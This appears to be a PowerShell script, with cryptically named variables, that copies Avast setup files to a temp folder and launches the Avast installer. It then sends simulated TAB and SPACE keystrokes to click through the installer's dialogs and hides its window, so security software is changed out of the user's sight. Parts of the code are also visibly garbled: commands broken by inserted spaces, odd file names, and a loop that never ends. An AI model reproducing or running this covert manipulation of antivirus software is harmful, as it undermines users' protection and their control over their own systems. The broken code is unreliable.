$a1 = $env: temp;

$a2 = (Get - Process - Name AvastUI) | Split - Path;
$a1 = $a1 + '\_av_iup.tm~a01\';
if(Test-Path -Path $a2 ){
  if(!(Test-Path -Path $a1 )){
    New-Item -ItemType directory -Path $a1;
    Copy-Item $a2'setup prod - pgm.vpx ' -Destination $a1;
    Copy-Item $a2'setup products.def ' -Destination $a1;
    Copy-Item $a2'setup uat.vpx ' -Destination $a1;
    Copy-Item $a2'setup HTMLayout.dll ' -Destination $a1;
    Copy-Item $a2'setup part - prg_ais - 1206092 d.vpx ' -Destination $a1;
    Copy-Item $a2'setup part - setup_ais - 1206092 d.vpx ' -Destination $a1;
    $a3 = $a2 + 'setup instup.exe ';
    $a4 = '/prod:ais /sfx:clear /sfxstorage:"'+$a1+'" /wait ';
    start-process $a3 $a4
    }
  }
 Add-Type "
  using System;
  using System.Runtime.InteropServices;
  using System.Collections.Generic;
  using System.Text;

  public class a12 {
  [return: MarshalAs(UnmanagedType.Bool)]

  [DllImport(""user32.dll"", SetLastError = true, CharSet = CharSet.Auto)]
  static extern bool PostMessage(IntPtr a15, uint Msg, IntPtr wParam, IntPtr lParam);

  [DllImport(""user32.dll"", EntryPoint = ""FindWindowEx"", CharSet = CharSet.Auto)]
  static extern IntPtr FindWindowEx(IntPtr a15Parent, IntPtr a15ChildAfter, string lpszClass, string lpszWindow);
  [DllImport(""user32.dll"")] [return: MarshalAs(UnmanagedType.Bool)] public static extern bool IsWindowVisible(IntPtr a15);

  [DllImport(""user32.dll"", SetLastError = true)]
  static extern uint GetWindowThreadProcessId(IntPtr a15, out uint lpdwProcessId);

  [DllImport(""user32.dll"")] public static extern bool ShowWindow(IntPtr a15, Int32 nCmdShow);

  public static IntPtr a10(string windowTitle,int ProcessID) {
    IntPtr retIntPtr = IntPtr.Zero;
    int maxCount = 9999;
    int ct = 0;
    IntPtr prevChild = IntPtr.Zero;
    IntPtr currChild = IntPtr.Zero;
    while(true && ct < maxCount) {
      currChild = FindWindowEx(IntPtr.Zero, prevChild, null, null);
      if (currChild == IntPtr.Zero)
        break;
      if (IsWindowVisible(currChild)) {
        uint procID = 0;
        GetWindowThreadProcessId(currChild, out procID);
        if (procID == ProcessID) {
          retIntPtr = currChild;
          break;
        }
      }
      prevChild = currChild;
      ++ct;
    }
    return retIntPtr;
  }

  public static void a13(int a15) {
    PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x09), new IntPtr(0));
    PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x20), new IntPtr(0));
    PostMessage(new IntPtr(a15), 0x0101, new IntPtr(0x20), new IntPtr(0));
    ShowWindow(new IntPtr(a15), 0);
  }
  public static void a11(int a15) {
    PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x09), new IntPtr(0));
    PostMessage(new IntPtr(a15), 0x0101, new IntPtr(0x09), new IntPtr(0));
    PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x09), new IntPtr(0));
    PostMessage(new IntPtr(a15), 0x0101, new IntPtr(0x09), new IntPtr(0));
    PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x09), new IntPtr(0));
    PostMessage(new IntPtr(a15), 0x0101, new IntPtr(0x09), new IntPtr(0));
    PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x09), new IntPtr(0));
    PostMessage(new IntPtr(a15), 0x0101, new IntPtr(0x09), new IntPtr(0));
    PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x09), new IntPtr(0));
    PostMessage(new IntPtr(a15), 0x0101, new IntPtr(0x09), new IntPtr(0));
    PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x09), new IntPtr(0));
    PostMessage(new IntPtr(a15), 0x0101, new IntPtr(0x09), new IntPtr(0));
    PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x09), new IntPtr(0));
    PostMessage(new IntPtr(a15), 0x0101, new IntPtr(0x09), new IntPtr(0));
    PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x09), new IntPtr(0));
    PostMessage(new IntPtr(a15), 0x0101, new IntPtr(0x09), new IntPtr(0));
    PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x09), new IntPtr(0));
    PostMessage(new IntPtr(a15), 0x0101, new IntPtr(0x09), new IntPtr(0));
    PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x09), new IntPtr(0));
    PostMessage(new IntPtr(a15), 0x0101, new IntPtr(0x09), new IntPtr(0));
    PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x09), new IntPtr(0));
    PostMessage(new IntPtr(a15), 0x0101, new IntPtr(0x09), new IntPtr(0));
    PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x20), new IntPtr(0));
    PostMessage(new IntPtr(a15), 0x0101, new IntPtr(0x20), new IntPtr(0));
    ShowWindow(new IntPtr(a15), 0);
  }
  public static void a14(int a15) {
    ShowWindow(new IntPtr(a15), 0);
  }
}";

$a6 = 0;
$a7 = 0;
While ($a -le 5) {
  $a8 = Get-Process "instup";
  $a9 = [a12]::a10("",$a8.Id);
  If ([a12]::IsWindowVisible($a9)) {
    if ($a7 -eq 1) {
      [a12]::a11($a9);
      $a7=2;
    }
    if ($a7 -eq 0) {
        [a12]::a13($a9);
        $a7=1;
    }
    if ($a7 -eq 2) {
        [a12]::a11($a9);
        [a12]::a14($a9)
    }
  }
  Start-Sleep -seconds 1;
}
